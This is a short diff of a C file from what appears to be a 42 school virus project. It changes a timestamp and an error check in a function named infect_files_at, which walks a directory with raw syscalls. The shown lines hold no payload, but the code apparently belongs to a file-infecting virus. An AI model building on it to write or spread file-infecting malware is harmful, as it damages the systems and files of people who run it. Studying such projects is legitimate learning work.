@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 03:37:14 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/26 22:11:30 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/27 00:44:23 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -43,7 +43,7 @@ static void	infect_files_at(char path[PATH_MAX], char *path_end, uint64_t seed[2
 	int		fd = sys_open(path, O_RDONLY);
 	int		nread;
 
-	if (fd == -1) return;
+	if (fd < 0) return;
 
 	*path_end++ = '/';
 	while ((nread = sys_getdents64(fd, (void*)buff, 1024)) > 0)
